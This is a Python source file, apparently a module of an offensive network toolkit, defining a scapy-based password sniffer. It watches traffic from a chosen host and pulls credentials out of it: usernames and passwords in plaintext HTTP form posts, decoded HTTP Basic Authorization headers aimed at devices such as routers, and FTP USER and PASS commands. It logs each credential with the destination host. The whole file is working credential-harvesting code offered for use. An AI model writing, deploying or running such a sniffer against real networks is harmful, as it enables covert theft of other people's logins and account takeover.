import stream
import util
from base64 import b64decode
from sniffer import Sniffer
from re import findall,search
from scapy.all import *

class password_sniffer(Sniffer):
	""" Sniff and parse passwords from various protocols """
	def __init__(self):
		super(password_sniffer, self).__init__('Password Sniffer')

	def initialize(self):
		""" initialize sniffer """
		self.get_ip()
		tmp = raw_input('[!] Sniff passwords from %s.  Is this correct? '%self.source)
		if 'n' in tmp.lower():
			return None

		self.sniff_filter = "src %s"%self.source
		self.run()
		return self.source
	
	def dump(self, pkt):
		"""Packet callback; parse packets"""
		if not pkt is None:
			# http
			if pkt.haslayer(TCP) and pkt.getlayer(TCP).dport == 80 and pkt.haslayer(Raw):
				payload = pkt.getlayer(Raw).load
				if 'username' in payload or 'password' in payload:
					username = re.search('username=(.*?)(&|$| )',payload)
					password = re.search('password=(.*?)(&|$| )',payload)
					if username is not None and password is not None:
						self.log_msg('Host: %s\nUsername: %s\nPassword: %s'%
										(pkt[IP].dst,username.groups(0)[0],password.groups(0)[0]))
				elif 'Authorization:' in payload:
					# such as routers
					pw = re.search('Authorization: Basic (.*)',payload)
					if pw.groups(0) is not None:
						self.log_msg('Authorization to %s: %s'%(pkt[IP].dst,b64decode(pw.groups(0)[0])))
			# ftp
			elif pkt.haslayer(TCP) and pkt.getlayer(TCP).dport == 21:
				payload = str(pkt.sprintf("%Raw.load%"))
				# strip control characters
				payload = payload[:-5] 
				prnt = None
				if 'USER' in payload:
					prnt = "Host: %s\n[!] User: %s "%(pkt[IP].dst,findall("(?i)USER (.*)", payload)[0])
				elif 'PASS' in payload:
					prnt = 'Pass: %s'%findall("(?i)PASS (.*)", payload)[0]
				if not prnt is None:
					self.log_msg(prnt)
			# TODO: other protos....
